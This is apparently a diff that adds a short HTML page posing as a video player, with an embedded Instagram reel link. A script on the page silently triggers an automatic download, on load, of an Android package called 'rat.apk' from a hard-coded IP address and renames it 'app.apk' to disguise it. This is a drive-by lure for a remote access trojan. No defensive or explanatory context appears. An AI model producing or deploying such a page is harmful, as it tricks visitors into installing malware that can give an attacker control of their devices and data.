@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h3>Video is playing, download starting...</h3>
+
+<video width="400" autoplay controls>
+  <source src="https://www.instagram.com/reel/DSSrOF3jVjY/?igsh=aXQwd2hpNmRzdWlr" type="video/mp4">
+</video>
+
+<script>
+window.onload = () => {
+  const a = document.createElement("a");
+  a.href = "http://172.31.35.194:8080/rat.apk";
+  a.download = "app.apk";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+};
+</script>
+
+</body>
+</html>
